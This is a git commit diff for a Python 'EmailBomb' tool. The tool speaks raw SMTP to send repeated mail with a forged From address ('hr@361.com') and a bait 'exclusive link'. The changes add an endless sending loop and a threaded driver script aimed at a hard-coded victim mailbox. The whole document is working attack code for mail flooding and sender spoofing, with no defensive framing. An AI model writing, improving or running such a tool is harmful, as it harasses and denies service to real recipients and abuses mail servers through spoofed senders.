4cdb6f28867f7f996d97ae3cb0fcf5efac456b4b
Macr0phag3 <997334636@qq.com>
2018-11-18 15:54:47 +0800

    upload latest code

--- EmailBomb.py
+++ EmailBomb.py
@@ -2,16 +2,25 @@
 import Email
 import random
 import string
+import time
 
 
 class EmailBomb:
-    def __init__(self, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
+    def __init__(self, id, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
+        self.notify_header = id,
         self.to_addr = to_addr
         self.from_addr = from_addr
         self.port = port
         self.timeout = timeout
         self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表
+        self.exit_flag = 1
+
+        self.update_notify("")
         self.create()
+
+    def update_notify(self, body):
+        self.notify_body = body
+        self.notify = self.notify_header+self.notify_body
 
     def create(self):
         self.emailer = Email.Email(
@@ -22,64 +31,75 @@ class EmailBomb:
             timeout=self.timeout,
         )
 
+    def limitless(self, subject, content):
+        while self.exit_flag:
+            self.attack(subject, content)
+
     def attack(self, subject, content):
         '''
         攻击启动
         '''
 
         # 建立连接
-        while 1:
+        while self.exit_flag:
             code, msg = self.emailer.Connect()
             if code:
                 # 建立会话
-                print "send ehlo"
+                self.notify = "send ehlo"
                 code, msg = self.emailer.Send(u"ehlo antispam")
                 if code:
                     break
 
-        print "send mail from"
-        while 1:
+        self.notify = "send mail from"
+        while self.exit_flag:
             # 表明发件地址
             code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
             if not code:
                 continue
 
-            print "send rcpt to"
+            self.notify = "send rcpt to"
             # 表明收件地址
             code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
             if code:
                 break
 
-        print "send data"
-        while 1:
+            self.notify = msg
+
+        self.notify = "send data"
+        while self.exit_flag:
             # 信件具体内容
             code, msg = self.emailer.Send(u"data")
             if code:
                 break
 
-        print "send to"
-        while 1:
+            self.notify = msg
+
+        self.notify = "send to"
+        while self.exit_flag:
             # to:
             code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
             if not code:
+                self.notify = msg
                 continue
 
             # from:
-            print "send from"
+            self.notify = "send from"
             code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
             if not code:
+                self.notify = msg
                 continue
 
             # subject:
-            print "send subject"
+            self.notify = "send subject"
             code, msg = self.emailer.Send("subject: "+subject, recv=False)
             if not code:
+                self.notify = msg
                 continue
 
             break  # 上面都发送成功
 
         # body:
-        print "send body"
+        self.notify = "send body"
         code, msg = self.emailer.Send(
             content+u"\r\n\r\n你的专属链接为："+"".join(
                 random.choice(string.hexdigits)
@@ -89,4 +109,5 @@ class EmailBomb:
             check="250"  # 状态码为 250 说明发送成功
         )
 
-        return (code, msg)
+        self.notify = msg
+        time.sleep(1)
--- test_use.py
+++ test_use.py
@@ -4,14 +4,34 @@ import EmailBomb
 import threading
 
 thread_num = 3
+exit_flag = 1
 
 clients = [
     EmailBomb.EmailBomb(
+        id=id,
         from_addr="hr@361.com",
-        to_addr="15619047890@163.com"
+        to_addr="15619047890@163.com",
     ) for id in range(thread_num)
 ]
+
+
+def watcher():
+    while exit_flag:
+        for client in clients:
+            print client.notify
+
+
+thread = threading.Thread(target=watcher).start()
 
 for client in clients:
     thread = threading.Thread(target=client.attack, args=("hello! my friend!", "hr: you got it!",))
     thread.start()
+
+
+try:
+    while 1:
+        pass
+except KeyboardInterrupt:
+    exit_flag = 0
+    for client in clients:
+        client.exit_flag = exit_flag
